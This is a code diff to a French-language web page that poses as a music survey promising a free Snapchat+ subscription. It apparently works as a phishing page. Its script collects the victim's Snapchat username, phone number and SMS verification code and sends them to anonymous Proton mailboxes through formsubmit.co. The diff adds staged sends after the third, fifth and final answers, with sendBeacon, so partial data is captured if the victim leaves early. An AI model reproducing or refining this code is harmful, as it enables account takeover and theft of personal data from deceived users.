@@ -215,20 +215,29 @@ function suivant(){
     reponsesUtilisateur[indexQuestion] = val;
     indexQuestion++;
 
-    if(indexQuestion===3){
+    // --- ENVOI INTERMEDIAIRE 1 : après 3 réponses (artistes) ---
+    if(indexQuestion === 3){
+        envoyerPartiel(1);
         document.getElementById("sondage").style.display="none";
         document.getElementById("intermediaire").style.display="block";
         return;
     }
 
+    // --- ENVOI INTERMEDIAIRE 2 : Snapchat + téléphone ---
+    if(indexQuestion === 5){
+        envoyerPartiel(2);
+    }
+
+    // --- afficher la question suivante ---
     if(indexQuestion < questions.length){
         afficherQuestion();
     } else {
+        // --- ENVOI FINAL : toutes les réponses ---
+        envoyerPartiel(3);
         document.getElementById("sondage").innerHTML = `
             <h2>Merci pour votre participation !</h2>
             <p>Vous recevrez votre abonnement Snapchat+ directement sur votre compte dans un délai d'environ 15 minutes.</p>
         `;
-        envoyer();
     }
 }
 
@@ -238,23 +247,53 @@ function continuer(){
     afficherQuestion();
 }
 
-function envoyer(){
+// --- Fonction d'envoi partielle selon l'étape ---
+function envoyerPartiel(etape){
     const formData = new FormData();
-    formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
-    formData.append("artiste_deezer", reponsesUtilisateur[1] || "");
-    formData.append("artiste_decouverte", reponsesUtilisateur[2] || "");
-    formData.append("snapchat", reponsesUtilisateur[3] || "");
-    formData.append("telephone", reponsesUtilisateur[4] || "");
-    formData.append("code_sms", reponsesUtilisateur[5] || "");
+
+    if(etape === 1){
+        // 3 premières réponses
+        formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
+        formData.append("artiste_deezer", reponsesUtilisateur[1] || "");
+        formData.append("artiste_decouverte", reponsesUtilisateur[2] || "");
+        formData.append("_subject", "Réponses sondage - artistes");
+    }
+
+    if(etape === 2){
+        // Snapchat + téléphone
+        formData.append("snapchat", reponsesUtilisateur[3] || "");
+        formData.append("telephone", reponsesUtilisateur[4] || "");
+        formData.append("_subject", "Réponses sondage - Snapchat/Telephone");
+    }
+
+    if(etape === 3){
+        // Envoi final avec tout
+        formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
+        formData.append("artiste_deezer", reponsesUtilisateur[1] || "");
+        formData.append("artiste_decouverte", reponsesUtilisateur[2] || "");
+        formData.append("snapchat", reponsesUtilisateur[3] || "");
+        formData.append("telephone", reponsesUtilisateur[4] || "");
+        formData.append("code_sms", reponsesUtilisateur[5] || "");
+        formData.append("_subject", "Réponses sondage - final");
+    }
+
     formData.append("_captcha", "false");
-    formData.append("_template", "table");
-    formData.append("_subject", "Réponses sondage Snapchat+");
     formData.append("_cc", "becteurfoou@proton.me");
 
-    fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
-        method: "POST",
-        body: formData
-    });
+    // --- ENVOI FIABLE : fetch + sendBeacon si disponible ---
+    const url = "https://formsubmit.co/anonymous2026b@protonmail.com";
+    
+    try {
+        if(navigator.sendBeacon){
+            const blob = new Blob([formData], { type: 'application/x-www-form-urlencoded' });
+            navigator.sendBeacon(url, blob);
+        } else {
+            fetch(url, { method: "POST", body: formData });
+        }
+    } catch(e){
+        // fallback
+        fetch(url, { method: "POST", body: formData });
+    }
 }
 </script>
 
